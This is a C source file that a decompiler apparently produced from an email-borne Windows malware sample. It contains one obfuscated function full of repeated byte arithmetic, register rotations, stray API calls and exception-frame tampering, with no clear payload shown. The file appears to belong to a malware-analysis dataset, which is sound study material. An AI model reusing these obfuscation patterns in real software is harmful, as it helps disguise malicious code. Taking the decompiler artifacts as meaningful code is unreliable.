// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_1330/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn004011F8(int32 ecx, word32 edx, byte * ebx, word32 ebp, word32 esi, Eq_246 * fs, LPCWSTR, LPCWSTR)
{
	byte al_14 = (byte) ebx;
	word32 edx_17 = __rol(edx, 0x02);
	byte v13_21 = *ebx + al_14;
	*ebx = v13_21;
	byte v14_23 = *ebx + al_14;
	*ebx = v14_23;
	byte v15_25 = *ebx + al_14;
	*ebx = v15_25;
	byte v16_27 = *ebx + al_14;
	*ebx = v16_27;
	byte v17_29 = *ebx + al_14;
	*ebx = v17_29;
	byte v18_31 = *ebx + al_14;
	*ebx = v18_31;
	byte v19_33 = *ebx + al_14;
	*ebx = v19_33;
	byte v20_35 = *ebx + al_14;
	*ebx = v20_35;
	byte v21_37 = *ebx + al_14;
	*ebx = v21_37;
	byte v22_39 = *ebx + al_14;
	*ebx = v22_39;
	byte v23_41 = *ebx + al_14;
	*ebx = v23_41;
	byte v24_43 = *ebx + al_14;
	*ebx = v24_43;
	byte v25_45 = *ebx + al_14;
	*ebx = v25_45;
	byte v26_47 = *ebx + al_14;
	*ebx = v26_47;
	int32 ecx_3 = ecx >> 0x00000007;
	Mem48[0x00401075:word32]();
	Eq_128 * esi_70 = fp;
	do
	{
		word32 eax_78 = esi_70->dw0000;
		esi_70 = esi_70 + 1;
		ecx_3 = __ror(ecx_3, 0x0A);
	} while (eax_78 != 0x00000000);
	word16 ax_102 = (word16) __ror(eax_78, 0x12);
	Eq_146 esi_106 = esi_70 - 0x6CC206AD | 0xE4FCA2ED;
	if (DPB(0x00000090, 0x90 - (~0xFFFFFFF8)[ebp], 0, 8) != 0x00000000)
	{
		ImageList_GetDragImage(esi_106, (POINT *) 0x56EF2652);
		RegLoadKeyW(esi_106, tArg00, tArg04);
		return;
	}
	else
	{
		word32 edi_159 = Mem48[DPB(0x0012D153, ax_102, 0, 16):word32];
		__rol(ax_102, 0x04);
		word32 ecx_163 = 0x004010E8;
		word32 eax_166 = globals->dw40110D;
		do
		{
			edi_159 = edi_159 + 1;
			ecx_163 = ecx_163 + edi_159 ^ edi_159;
			word32 edx_179 = edi_159->dw0000 - eax_166;
		} while (edx_179 != 0x00000000);
		__ror(ecx_163, 0x02);
		word32 eax_188 = ~(eax_166 | 0x93D50305);
		word32 edx_194 = DPB(edx_179, edi_159->wFFFFFFFD, 0, 16);
		__rol(DPB(eax_188, __rol((word16) eax_188, 0x0C), 0, 16) + &edi_159->wFFFFFFFD, 0x1E);
		word32 edi_218 = globals->dw40104D;
		Eq_224 * edx_212 = fp->t0001;
		word32 esi_220 = edi_218 & 0x0040104D;
		int32 eax_228 = edx_212->dw0000;
		esi_220 = esi_220 - eax_228;
		edx_212 = edx_212 + 1;
		word16 si_235 = (word16) esi_220;
		word16 ax_240 = (word16) (eax_228 >> 0x00000011);
		while ((eax_228 ^ edi_218) != 0x00000000)
		{
			eax_228 = edx_212->dw0000;
			esi_220 = esi_220 - eax_228;
			edx_212 = edx_212 + 1;
			si_235 = (word16) esi_220;
			ax_240 = (word16) (eax_228 >> 0x00000011);
		}
		word32 eax_250 = DPB(eax_228 >> 0x00000011, __ror(ax_240, 0x0C), 0, 16);
		__ror(si_235, 0x0A);
		fs->dw0000 = fp - 0x00000008;
		__ror((word16) (((edx_194 << 0x00000010 >>u 0x00000010) + 0x003F142D ^ eax_250) << 0x0000000B), 0x04);
		return;
	}
}

